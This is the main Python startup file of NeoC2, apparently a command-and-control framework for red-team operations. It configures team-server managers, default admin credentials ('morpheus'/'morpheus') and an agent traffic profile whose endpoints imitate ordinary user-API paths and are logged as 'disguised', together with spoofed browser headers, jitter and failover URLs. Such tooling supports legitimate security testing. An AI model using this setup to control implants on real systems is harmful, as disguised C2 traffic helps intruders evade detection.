from gevent import monkey
monkey.patch_all()
import os
import sys
import time
import threading
import ssl
import signal
import argparse
import json
import uuid
from datetime import datetime
import logging

from core.config import NeoC2Config
from core.models import NeoC2DB

from communication.protocol_manager import ProtocolManager
from teamserver.module_manager import ModuleManager
from teamserver.task_orchestrator import TaskOrchestrator

from teamserver.session_manager import SessionManager
from teamserver.user_manager import UserManager
from teamserver.role_manager import RoleManager
from teamserver.audit_logger import AuditLogger
from teamserver.listener_manager import ListenerManager
from teamserver.agent_manager import AgentManager
from teamserver.remote_cli_server import RemoteCLIServer

from web.web_app import NeoC2Web


def setup_logging():
    logging.basicConfig(
        level=logging.INFO,
        format='[%(levelname)-8s] %(asctime)s - %(message)s',
        datefmt='%Y-%m-%d %H:%M:%S'
    )
    return logging.getLogger('NeoC2')

class NeoC2Framework:
    def __init__(self, config_path=None):
        self.config = NeoC2Config(config_path)
        db_path = os.environ.get('NEOC2_DB_PATH', self.config.get('database.path', 'neoc2.db'))
        db_dir = os.path.dirname(db_path) if os.path.dirname(db_path) else '.'
        os.makedirs(db_dir, exist_ok=True)
        self.db = NeoC2DB(db_path)
        self.running = False
        self.startup_time = None
        self.logger = setup_logging()
        
        self._initialize_managers()
        
        self._initialize_multiplayer()
        
        self._initialize_remote_cli()
        
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)
    
    
    
    def _initialize_managers(self):
        try:
            self.logger.info("Initializing framework managers...")
        
            self.logger.info("  Initializing database tables...")
            self.db.init_db()
            self.logger.info("  Database tables initialized successfully")
            
            self.distributed_manager = None
            
        
            self.logger.info("  Initializing protocol_manager...")
            self.protocol_manager = ProtocolManager(self.config)
        
            self.logger.info("  Initializing module_manager...")
            self.module_manager = ModuleManager(self.config, self.db)
        
            self.logger.info("  Initializing session_manager...")
            self.session_manager = SessionManager(self.db)
        
            self.logger.info("  Initializing user_manager...")
            self.user_manager = UserManager(self.db)
        
            self.logger.info("  Initializing role_manager...")
            self.role_manager = RoleManager(self.db)
        
            self.logger.info("  Initializing audit_logger...")
            self.audit_logger = AuditLogger(self.db)
        
            self.logger.info("  Initializing listener_manager...")
            self.listener_manager = ListenerManager(self.config, self.db)
        
            self.logger.info("  Initializing agent_manager...")
            self.agent_manager = AgentManager(self.db, audit_logger=self.audit_logger)

            self.logger.info("  Initializing task_orchestrator...")
            self.task_orchestrator = TaskOrchestrator(
            self.module_manager,
            self.agent_manager,
            self.db
            )

            self.logger.info("  Initializing web application...")
            self.web_app = NeoC2Web(
                self.config,
                self.db,
                self.protocol_manager,
                self.module_manager,
                self.session_manager,
                self.user_manager,
                self.role_manager,
                self.agent_manager, # Pass agent_manager to web app
                self.task_orchestrator 
            )

            self.logger.info("  Loading default modules...")
            self.module_manager.add_default_modules()

            self.logger.info("  Creating/Updating profiles to hybrid format...")
            self._update_profiles_to_hybrid()

            self.logger.info("  Writing default hybrid profile to JSON...")
            self._write_default_profile_to_json()
        
            self.logger.info("  Creating default roles...")
            self._create_default_roles()
        
            self.logger.info("  Creating default users...")
            self._create_default_users()
        
            self.logger.info("All managers initialized successfully")
            
            self.logger.info("Legacy communication protocols initialized successfully")
            
            self.logger.info("Running final verification...")
            default_user = os.environ.get('DEFAULT_USERNAME', 'morpheus')
            default_pass = os.environ.get('DEFAULT_PASSWORD', 'morpheus')
            final_test = self.user_manager.authenticate(default_user, default_pass)
            if final_test:
                self.logger.info("FINAL VERIFICATION: Admin login working correctly!")
                self.logger.info(f"  User: {final_test['username']}")
                self.logger.info(f"  Role: {final_test['role_name']}")
            else:
                self.logger.error("FINAL VERIFICATION: Admin login still not working!")
                self.logger.debug("Running final debug check...")
                self.user_manager.debug_user_creation()
        
        except Exception as e:
            self.logger.error(f"Error initializing managers: {str(e)}")
            import traceback
            traceback.print_exc()
            sys.exit(1)
            
    def _initialize_multiplayer(self):
        try:
            self.logger.info("Initializing multiplayer components...")
            
            from teamserver.multiplayer_session_manager import MultiplayerSessionManager
            from teamserver.multiplayer_coordinator import MultiplayerCoordinator
            from teamserver.multiplayer_agent_manager import MultiplayerAgentManager
            
            self.multiplayer_session_manager = MultiplayerSessionManager(self.db, self.web_app.socketio)
            self.multiplayer_coordinator = MultiplayerCoordinator(self.db, self.web_app.socketio)
            
            old_agent_manager = self.agent_manager
            self.agent_manager = MultiplayerAgentManager(
                self.db, 
                silent_mode=True, 
                multiplayer_coordinator=self.multiplayer_coordinator
            )
            
            self.multiplayer_coordinator.audit_logger = self.audit_logger
            self.multiplayer_session_manager.audit_logger = self.audit_logger
            
            for attr in ['agents', 'agent_tasks', 'agent_results', 'silent_mode', 'db', 'logger', 'interactive_result_callback']:
                if hasattr(old_agent_manager, attr):
                    setattr(self.agent_manager, attr, getattr(old_agent_manager, attr))
            
            self.multiplayer_session_manager.start()
            self.multiplayer_coordinator.start()
            
            self.web_app.app.multiplayer_session_manager = self.multiplayer_session_manager
            self.web_app.app.multiplayer_coordinator = self.multiplayer_coordinator
            self.web_app.app.multiplayer_agent_manager = self.agent_manager

            if hasattr(self, 'remote_cli_server') and self.remote_cli_server:
                self.remote_cli_server.agent_manager = self.agent_manager  # Update reference
                self.agent_manager.register_interactive_result_callback(self.remote_cli_server.broadcast_interactive_result)
                self.agent_manager.register_agent_callback(self.remote_cli_server.broadcast_agent_update)
            
            self.logger.info("Multiplayer components initialized successfully")
            
        except Exception as e:
            self.logger.error(f"Error initializing multiplayer components: {str(e)}")
            import traceback
            traceback.print_exc()
    
    def _initialize_remote_cli(self):
        try:
            remote_cli_enabled = self.config.get('remote_cli.enabled', True)  # Default to enabled
            
            if remote_cli_enabled:
                self.logger.info("Initializing Remote CLI server...")
                
                from teamserver.remote_cli_server import RemoteCLIServer
                self.remote_cli_server = RemoteCLIServer(
                    config=self.config,
                    db=self.db,
                    agent_manager=self.agent_manager,
                    listener_manager=self.listener_manager,
                    multiplayer_coordinator=self.multiplayer_coordinator,
                    audit_logger=self.audit_logger
                )
                
                if self.remote_cli_server.start():
                    self.logger.info("Remote CLI server initialized and started successfully")
                    
                    self.web_app.app.remote_cli_server = self.remote_cli_server
                else:
                    self.logger.error("Failed to start Remote CLI server")
            else:
                self.logger.info("Remote CLI server is disabled in configuration")
                
        except Exception as e:
            self.logger.error(f"Error initializing remote CLI server: {str(e)}")
            import traceback
            traceback.print_exc()
    
    def _create_default_web_listener(self):
        try:
            self.logger.info("Creating default HTTP listener that runs on separate process/port for agent communications...")

            existing_listener = self.db.get_listener_by_name("web_app_default")
            if existing_listener:
                self.logger.info(f"Default HTTP listener already exists: {existing_listener['id'][:8]}...")
                self.db.update_listener_status(existing_listener['id'], 'running')
                return existing_listener['id']

            listener_id = str(uuid.uuid4())
            web_host = os.environ.get('IP', self.config.get('web.host', '0.0.0.0'))
            default_listener_port = 443

            import socket
            if self._is_port_in_use(web_host, default_listener_port):
                self.logger.warning(f"Port {default_listener_port} is already in use!")
                test_port = default_listener_port + 1
                max_attempts = 10  # Reduced attempts to find an alternative quickly
                attempts = 0
                while self._is_port_in_use(web_host, test_port) and attempts < max_attempts:
                    test_port += 1
                    attempts += 1

                if attempts >= max_attempts:
                    self.logger.error("Could not find an available port for the default listener!")
                    return None

                default_listener_port = test_port
                self.logger.info(f"Using alternative port {default_listener_port} instead of 443")

            self.db.create_listener(
                listener_id=listener_id,
                name="web_app_default",
                listener_type='https',
                host=web_host,
                port=default_listener_port,
                profile_name='default',
                config={
                    'separate_process': True,
                    'description': 'Default HTTP listener running on separate process/port for agent communications'
                }
            )

            self.logger.info("Default HTTP listener created successfully:")
            self.logger.info(f"  - ID: {listener_id[:8]}...")
            self.logger.info(f"  - Name: web_app_default")
            self.logger.info(f"  - Host: {web_host}")
            self.logger.info(f"  - Port: {default_listener_port}")
            self.logger.info(f"  - Type: https (separate process for agent communications)")

            return listener_id

        except Exception as e:
            self.logger.error(f"Error creating default HTTP listener: {str(e)}")
            import traceback
            traceback.print_exc()
            return None

    def _is_port_in_use(self, host, port):
        """Check if a port is already in use"""
        import socket
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try:
                s.bind((host, port))
                return False  # Port is available
            except socket.error:
                return True  # Port is in use

    
    def _create_default_roles(self):
        try:
            with self.db.get_cursor() as cursor:
                cursor.execute("SELECT id, name FROM roles")
                existing_roles = cursor.fetchall()
                
            if existing_roles:
                role_list = [(r['id'][:8] + '...', r['name']) for r in existing_roles]
                self.logger.info(f"Found existing roles: {role_list}")
                return
            
            self.logger.info("No existing roles found, creating default roles...")
            
            # Create default roles
            default_roles = [
                {
                    "id": str(uuid.uuid4()),  # Generate proper UUID
                    "name": "admin",
                    "description": "Full access to all features",
                    "permissions": ["*"]
                },
                {
                    "id": str(uuid.uuid4()),  # Generate proper UUID
                    "name": "operator", 
                    "description": "Can manage agents and execute modules",
                    "permissions": [
                        "agents.list",
                        "agents.interact",
                        "tasks.create", 
                        "tasks.execute",
                        "modules.list",
                        "modules.execute",
                        "results.view",
                        "listeners.list",
                        "listeners.create",
                        "listeners.start",
                        "listeners.stop"
                    ]
                },
                {
                    "id": str(uuid.uuid4()),  # Generate proper UUID
                    "name": "viewer",
                    "description": "Read-only access",
                    "permissions": [
                        "agents.list",
                        "tasks.list", 
                        "modules.list",
                        "results.view",
                        "listeners.list",
                        "audit.view"
                    ]
                }
            ]
            
            for role in default_roles:
                try:
                    with self.db.get_cursor() as cursor:
                        cursor.execute(
                            "INSERT INTO roles (id, name, description, permissions, created_at) VALUES (?, ?, ?, ?, ?)",
                            (role["id"], role["name"], role["description"], 
                             json.dumps(role["permissions"]), datetime.now())
                        )
                    self.logger.info(f"Created role '{role['name']}' with ID: {role['id'][:8]}...")
                except Exception as e:
                    self.logger.error(f"Error creating role '{role['name']}': {str(e)}")
            
            self.logger.info("Default roles created")
            
            with self.db.get_cursor() as cursor:
                cursor.execute("SELECT id, name, permissions FROM roles")
                roles = cursor.fetchall()
                self.logger.info("Verified roles in DB:")
                for r in roles:
                    permissions = json.loads(r['permissions']) if r['permissions'] else []
                    self.logger.info(f"  - {r['name']} (id: {r['id'][:8]}...) - permissions: {permissions}")
                
        except Exception as e:
            self.logger.error(f"Error creating default roles: {str(e)}")
            import traceback
            traceback.print_exc()
    def _create_default_users(self):
            try:
                default_user = os.environ.get('DEFAULT_USERNAME')
                default_pass = os.environ.get('DEFAULT_PASSWORD')
                
                if not default_user or not default_pass:
                    self.logger.error("DEFAULT_USERNAME and DEFAULT_PASSWORD environment variables must be set!")
                    self.logger.error("Please configure them in .env file or systemd service configuration.")
                    return
            
                admin_user = self.user_manager.get_user_by_username(default_user)
                if admin_user:
                    self.logger.info(f"Default user '{default_user}' already exists")
                    return

                self.logger.info(f"Default user '{default_user}' not found, creating...")
            
                admin_role = None
                with self.db.get_cursor() as cursor:
                    cursor.execute("SELECT id FROM roles WHERE name = 'admin'")
                    admin_role_row = cursor.fetchone()
                
                if not admin_role_row:
                    self.logger.error("Admin role not found, cannot create admin user")
                    return
            
                admin_role_id = admin_role_row['id']
                self.logger.info(f"Using admin role ID: {admin_role_id[:8]}...")
            
                result = self.user_manager.create_user(
                    username=default_user,
                    email=f'{default_user}@neoc2.local', 
                    password=default_pass,
                    role_id=admin_role_id
                )
            
                if result['success']:
                    self.logger.info("Default admin user created successfully")
                    self.logger.info(f"  - Username: {default_user}")
                    self.logger.info(f"  - Password: [REDACTED]")
                
                    auth_result = self.user_manager.authenticate(default_user, default_pass)
                    self.logger.info(f"Admin authentication test: {'SUCCESS' if auth_result else 'FAILED'}")
                else:
                    self.logger.error(f"Failed to create admin user: {result['message']}")
                
            except Exception as e:
                self.logger.error(f"Error creating default users: {str(e)}")
                import traceback
                traceback.print_exc()
    def _update_profiles_to_hybrid(self):
        try:
            self.logger.info("Checking and updating profiles to hybrid format...")

            existing_profiles = self.db.get_all_profiles()
            default_profile = self.db.get_profile_by_name('default')

            if not default_profile:
                # Create a new hybrid profile if no default exists
                self.logger.info("Creating new hybrid default profile...")

                hybrid_config = {
                    "protocol": "https",

                    "http_get": {
                        "uri": "/api/v1/info",
                        "headers": {
                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                            "Accept": "application/json, text/plain, */*",
                            "Accept-Language": "en-US,en;q=0.9"
                        }
                    },

                    "http_post": {
                        "uri": "/api/v1/submit",
                        "headers": {
                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                            "Content-Type": "application/json",
                            "Accept": "application/json"
                        }
                    },


                    "endpoints": {
                        "register": "/api/users/register",
                        "tasks": "/api/users/{agent_id}/profile",
                        "results": "/api/users/{agent_id}/activity",
                        "download": "/api/assets/main.js",
                        "interactive": "/api/users/{agent_id}/settings",
                        "interactive_status": "/api/users/{agent_id}/status"
                    },

                    "headers": {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                        "Accept": "application/json"
                    },

                    "heartbeat_interval": 10,  # Seconds between check-ins
                    "jitter": 0.2,  # Decimal jitter factor (0.0-1.0)

                    "p2p_enabled": False,  # Enable/disable peer-to-peer agent communication
                    "p2p_port": 8888,      # Port for P2P communication between agents

                    "kill_date": "2027-12-31T23:59:59Z",  # Default kill date in ISO format
                    "working_hours": {
                        "start_hour": 0,      # Start of working hours
                        "end_hour": 24,       # End of working hours
                        "timezone": "UTC",    # Timezone for working hours
                        "days": [1, 2, 3, 4, 5, 6, 7]  # Days of week: 1=Monday, 2=Tuesday, ... 7=Sunday
                    },
                    "redirector": {
                        "redirector_host": "0.0.0.0",  # Default redirector host
                        "redirector_port": 80          # Default redirector port
                    },
                    "failover_urls": [
                        "https://failover1.example.com:443",
                        "https://failover2.example.com:443",
                        "https://backup1.example.com:8443",
                        "https://backup2.example.com:8443"
                    ]
                }

                profile_id = str(uuid.uuid4())
                self.db.create_profile(
                    profile_id=profile_id,
                    name='default',
                    description='Default HTTP communication profile (Hybrid format)',
                    config=hybrid_config
                )
                self.logger.info("Hybrid default profile created successfully")

                verify = self.db.get_profile_by_name('default')
                if verify:
                    self.logger.info(f"Verified: Default profile exists")
                    self.logger.info(f"  - http_get: ✓")
                    self.logger.info(f"  - http_post: ✓")
                    self.logger.info(f"  - endpoints: ✓")
                    self.logger.info(f"  - headers: ✓")
                    self.logger.info(f"  - heartbeat_interval: ✓")
                else:
                    self.logger.warning("Warning: Could not verify default profile creation")
                return

            # Check if the existing profile is already in hybrid format
            config = default_profile.get('config', {})
            has_listener_keys = 'http_get' in config and 'http_post' in config
            has_payload_keys = 'endpoints' in config and 'headers' in config

            if has_listener_keys and has_payload_keys:
                self.logger.info("Default profile already has hybrid format")
                return

            # Upgrade the existing profile to hybrid format
            self.logger.info("Updating default profile to hybrid format...")

            hybrid_config = {
                "protocol": "https",

                "http_get": {
                    "uri": config.get('http_get', {}).get('uri', '/api/v1/info'),
                    "headers": config.get('http_get', {}).get('headers', {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                        "Accept": "application/json, text/plain, */*",
                        "Accept-Language": "en-US,en;q=0.9"
                    })
                },

                "http_post": {
                    "uri": config.get('http_post', {}).get('uri', '/api/v1/submit'),
                    "headers": config.get('http_post', {}).get('headers', {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                        "Content-Type": "application/json",
                        "Accept": "application/json"
                    })
                },


                "endpoints": {
                    "register": "/api/users/register",
                    "tasks": "/api/users/{agent_id}/profile",
                    "results": "/api/users/{agent_id}/activity",
                    "download": "/api/assets/main.js",
                    "interactive": "/api/users/{agent_id}/settings",
                    "interactive_status": "/api/users/{agent_id}/status"
                },

                # For PayloadGenerator - Agent headers
                "headers": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                    "Accept": "application/json"
                },

                "heartbeat_interval": 10,  # Seconds between check-ins
                "jitter": 0.2,  # Decimal jitter factor (0.0-1.0)

                "p2p_enabled": config.get('p2p_enabled', False),
                "p2p_port": config.get('p2p_port', 8888),

                "kill_date": config.get('kill_date', "2027-12-31T23:59:59Z"),
                "working_hours": config.get('working_hours', {
                    "start_hour": 0,
                    "end_hour": 24,
                    "timezone": "UTC",
                    "days": [1, 2, 3, 4, 5, 6, 7]
                }),
                "redirector": config.get('redirector', {
                    "redirector_host": "0.0.0.0",
                    "redirector_port": 80
                }),
                "failover_urls": config.get('failover_urls', [
                    "https://failover1.example.com:443",
                    "https://failover2.example.com:443",
                    "https://backup1.example.com:8443",
                    "https://backup2.example.com:8443"
                ])
            }

            with self.db.get_cursor() as cursor:
                cursor.execute(
                    "UPDATE profiles SET config = ? WHERE name = ?",
                    (json.dumps(hybrid_config), 'default')
                )

            self.logger.info("Default profile updated to hybrid format successfully")

            updated_profile = self.db.get_profile_by_name('default')
            if updated_profile:
                updated_config = updated_profile['config']
                self.logger.info(f"Verified hybrid profile has {len(updated_config)} keys:")
                self.logger.info(f"  - http_get: {('http_get' in updated_config)}")
                self.logger.info(f"  - http_post: {('http_post' in updated_config)}")
                self.logger.info(f"  - endpoints: {('endpoints' in updated_config)}")
                self.logger.info(f"  - headers: {('headers' in updated_config)}")
                self.logger.info(f"  - heartbeat_interval: {('heartbeat_interval' in updated_config)}")

        except Exception as e:
            self.logger.error(f"Error updating profiles to hybrid format: {str(e)}")
            import traceback
            traceback.print_exc()


    def _write_default_profile_to_json(self):
        try:
            self.logger.info("Writing default profile to profiles/default.json...")

            # Create profiles directory if it doesn't exist
            os.makedirs('profiles', exist_ok=True)

            default_profile = self.db.get_profile_by_name('default')
            if not default_profile:
                self.logger.warning("No default profile found to write to JSON")
                return

            profile_data = {
                "name": default_profile['name'],
                "description": default_profile['description'],
                "config": default_profile['config']
            }

            with open('profiles/default.json', 'w') as f:
                json.dump(profile_data, f, indent=4)

            self.logger.info("Default profile successfully written to profiles/default.json")

        except Exception as e:
            self.logger.error(f"Error writing default profile to JSON: {str(e)}")
            import traceback
            traceback.print_exc()


    def start(self):
        """Start the NeoC2 framework and all its components"""
        try:
            self.logger.info("Starting NeoC2 Framework...")
            self.running = True
            self.startup_time = datetime.now()

            self.logger.info("Creating default HTTP listener on separate port...")
            self._create_default_web_listener()

            if hasattr(self, 'listener_manager'):
                self.logger.info("Starting listener manager...")
                self.listener_manager.start_all()
            else:
                self.logger.error("No listener_manager found!")

            if hasattr(self, 'web_app'):
                self.logger.info("Starting web application...")
                self.web_app.listener_manager = self.listener_manager
                self.web_app.start()
            
                if hasattr(self.web_app, 'register_listener_blueprints'):
                    self.web_app.register_listener_blueprints(self.listener_manager)
                    
                self.logger.info("Starting endpoint auto-discovery service...")
                try:
                    from web.routes_agent_comms import init_endpoint_discovery
                    self.endpoint_discovery = init_endpoint_discovery(self.web_app.app)
                    self.logger.info("Endpoint auto-discovery service started")
                except Exception as e:
                        self.logger.error(f"Failed to start endpoint auto-discovery: {str(e)}")
            else:
                self.logger.error("No web_app found!")

            if hasattr(self, 'session_manager'):
                self.logger.info("Starting session manager...")
                self.session_manager.start()
            else:
                self.logger.error("No session_manager found!")

            if hasattr(self, 'audit_logger'):
                self.logger.info("Starting audit logger...")
                self.audit_logger.start()
            else:
                self.logger.error("No audit_logger found!")

            # Start the agent manager
            if hasattr(self, 'agent_manager'):
                self.logger.info("Starting agent manager...")
                self.agent_manager.start()
            else:
                self.logger.error("No agent_manager found!")

            self._start_background_services()

            self.logger.info(f"NeoC2 Framework started successfully at {self.startup_time}")
            self.logger.info("  ✓ Multiplayer User Manageent Web interface running on main port")
            self.logger.info("  ✓ Agent communications unified with web app") 
            self.logger.info("  ✓ Default HTTP listener created for payload generation")
            self.logger.info("  ✓ All managers initialized and running")
            

            if hasattr(self, 'web_app'):

                web_port = int(os.environ.get('MULTI', self.config.get('web.port', 7443)))
                web_host = os.environ.get('IP', self.config.get('web.host', '0.0.0.0'))
                debug_mode = self.config.get('web.debug', False)  # Set to False in production

                self.logger.info(f"Starting web server on {web_host}:{web_port}")
                self.logger.info(f"MULTI environment variable: {os.environ.get('MULTI', 'Not set')}")
                self.logger.info(f"IP environment variable: {os.environ.get('IP', 'Not set')}")
                self.logger.info("Unified endpoints:")
                self.logger.info(f"  - Multiplayer Web Interface: http://{web_host}:{web_port}/")
                self.logger.info(f"  - Agent Registration: http://{web_host}:{web_port}/api/users/register (disguised)")
                self.logger.info(f"  - Agent Tasks: http://{web_host}:{web_port}/api/users/profile (disguised)")
                self.logger.info(f"  - Agent Results: http://{web_host}:{web_port}/api/users/activity (disguised)")
                self.logger.info(f"  - Agent Download: http://{web_host}:{web_port}/api/assets/main.js (disguised)")

                try:
                    ssl_context = None
                    protocol = "http"
                    if os.path.exists('server.crt') and os.path.exists('server.key'):
                        self.logger.info("SSL certificates found, upgrading to HTTPS.")
                        ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                        ssl_context.load_cert_chain(certfile='server.crt', keyfile='server.key')
                        protocol = "https"
                    else:
                        self.logger.warning("SSL certificates not found (server.crt, server.key). Running in HTTP mode.")

                    self.logger.info(f"Starting user management interface on {web_host}:{web_port} ({protocol.upper()})")
                    self.logger.info(f"MULTI environment variable: {os.environ.get('MULTI', 'Not set')}")
                    self.logger.info(f"IP environment variable: {os.environ.get('IP', 'Not set')}")
                    self.logger.info(f"  - Web Interface: {protocol}://{web_host}:{web_port}/")
                    self.logger.info(f"  - Agent Registration: {protocol}://{web_host}:{web_port}/api/users/register (disguised)")
                    self.logger.info(f"  - Agent Tasks: {protocol}://{web_host}:{web_port}/api/users/profile (disguised)")
                    self.logger.info(f"  - Agent Results: {protocol}://{web_host}:{web_port}/api/users/activity (disguised)")
                    self.logger.info(f"  - Agent Download: {protocol}://{web_host}:{web_port}/api/assets/main.js (disguised)")
                    
                    
                    socketio = self.web_app.socketio
                    
                    
                    socketio.run(
                        self.web_app.app,
                        host=web_host,
                        port=web_port,
                        debug=debug_mode,
                        use_reloader=False,  # Disable reloader in production
                        ssl_context=ssl_context,
                        allow_unsafe_werkzeug=True  # Allow unsafe Werkzeug for newer versions
                    )
                except Exception as e:
                    self.logger.error(f"Flask app run error: {str(e)}")
                    import traceback
                    traceback.print_exc()
                    return False
            else:
                self.logger.error("No web_app found for starting the web server!")
                return False

            return True

        except Exception as e:
            self.logger.error(f"Error starting framework: {str(e)}")
            import traceback
            traceback.print_exc()
            self.running = False
            return False
    def stop(self):
        try:
            self.logger.info("Stopping NeoC2 Framework...")
            self.running = False

            if hasattr(self, 'endpoint_discovery'):
                self.logger.info("Stopping endpoint auto-discovery service...")
                self.endpoint_discovery.stop()
                
            if hasattr(self, 'listener_manager'):
                self.logger.info("Stopping listener manager...")
                self.listener_manager.stop_all()
            
            if hasattr(self, 'session_manager'):
                self.logger.info("Stopping session manager...")
                self.session_manager.stop()
            
            if hasattr(self, 'audit_logger'):
                self.logger.info("Stopping audit logger...")
                self.audit_logger.stop()
            
            if hasattr(self, 'agent_manager'):
                self.logger.info("Stopping agent manager...")
                self.agent_manager.stop()
            
            if hasattr(self, 'remote_cli_server'):
                self.logger.info("Stopping remote CLI server...")
                self.remote_cli_server.stop()
            
            if hasattr(self, 'db'):
                self.logger.info("Closing database connections...")
                self.db.close_connection()
            
            self.logger.info("NeoC2 Framework stopped successfully")
            return True
            
        except Exception as e:
            self.logger.error(f"Error stopping framework: {str(e)}")
            return False
    
    def _signal_handler(self, signum, frame):
        self.logger.info(f"Received signal {signum}, shutting down gracefully...")
        self.stop()
        sys.exit(0)
    
    def _start_background_services(self):
        self.logger.info("Starting background services...")
        
        cleanup_thread = threading.Thread(target=self._periodic_cleanup)
        cleanup_thread.daemon = True
        cleanup_thread.start()
        
        if hasattr(self, 'agent_manager'):
            monitor_thread = threading.Thread(target=self.agent_manager.start_agent_result_monitor)
            monitor_thread.daemon = True
            monitor_thread.start()
        
        self.logger.info("Background services started")
    
    def _periodic_cleanup(self):
        """Perform periodic cleanup tasks"""
        while self.running:
            try:
                time.sleep(60)  # Check every minute
                
                if hasattr(self, 'session_manager'):
                    current_time = time.time()
                    if not hasattr(self, '_last_session_cleanup'):
                        self._last_session_cleanup = current_time
                    
                    if current_time - self._last_session_cleanup > 300:  # 5 minutes
                        self.session_manager.cleanup_inactive_sessions()
                        self._last_session_cleanup = current_time
                
                if hasattr(self, 'db'):
                    current_time = time.time()
                    if not hasattr(self, '_last_agent_cleanup'):
                        self._last_agent_cleanup = current_time
                    
                    if current_time - self._last_agent_cleanup > 600:  # 10 minutes
                        inactive_agents = self.db.get_inactive_agents(
                            self.config.get("agents.max_inactive_time", 300)
                        )
                        for agent in inactive_agents:
                            self.db.set_agent_inactive(agent['id'])
                        self._last_agent_cleanup = current_time
                
            except Exception as e:
                self.logger.error(f"Error during periodic cleanup: {str(e)}")
    
    def get_status(self):
        return {
            'running': self.running,
            'startup_time': self.startup_time.isoformat() if self.startup_time else None,
            'uptime': str(datetime.now() - self.startup_time) if self.startup_time else None,
            'managers': {
                'evasion_manager': hasattr(self, 'evasion_manager'),
                'protocol_manager': hasattr(self, 'protocol_manager'),
                'module_manager': hasattr(self, 'module_manager'),
                'session_manager': hasattr(self, 'session_manager'),
                'user_manager': hasattr(self, 'user_manager'),
                'role_manager': hasattr(self, 'role_manager'),
                'audit_logger': hasattr(self, 'audit_logger'),
                'listener_manager': hasattr(self, 'listener_manager'),
                'agent_manager': hasattr(self, 'agent_manager'),
                'task_orchestrator': hasattr(self, 'task_orchestrator'),
                'web_app': hasattr(self, 'web_app')
            }
        }

def main():
    parser = argparse.ArgumentParser(description="NeoC2 Framework")
    parser.add_argument("--config", help="Configuration file path")
    parser.add_argument("--init-db", action="store_true", help="Initialize database and exit")
    parser.add_argument("--generate-ssl", action="store_true", help="Generate SSL certificates and exit")
    parser.add_argument("--web-only", action="store_true", help="Run only web interface")
    parser.add_argument("--cli-only", action="store_true", help="Run only CLI interface")
    parser.add_argument("--status", action="store_true", help="Show framework status")
    parser.add_argument("--stop", action="store_true", help="Stop running framework")
    args = parser.parse_args()
    
    framework = NeoC2Framework(args.config)
    
    if args.init_db:
        framework.logger.info("Database initialized")
        return
    
    if args.generate_ssl:
        os.system("openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -days 365 -nodes -subj '/CN=localhost'")
        framework.logger.info("SSL certificates generated")
        return
    
    if args.status:
        status = framework.get_status()
        framework.logger.info(f"Framework Status: {'Running' if status['running'] else 'Stopped'}")
        if status['startup_time']:
            framework.logger.info(f"Startup Time: {status['startup_time']}")
        if status['uptime']:
            framework.logger.info(f"Uptime: {status['uptime']}")
        framework.logger.info("Managers:")
        for manager, enabled in status['managers'].items():
            framework.logger.info(f"  {manager}: {'✓' if enabled else '✗'}")
        return
    
    if args.stop:
        framework.stop()
        return
    
    if framework.start():
        framework.logger.info("Framework started successfully")
        
        try:
            while framework.running:
                time.sleep(1)
        except KeyboardInterrupt:
            framework.logger.info("\nReceived keyboard interrupt, shutting down...")
            framework.stop()
    else:
        framework.logger.error("Failed to start framework")
        sys.exit(1)

if __name__ == "__main__":
    main()
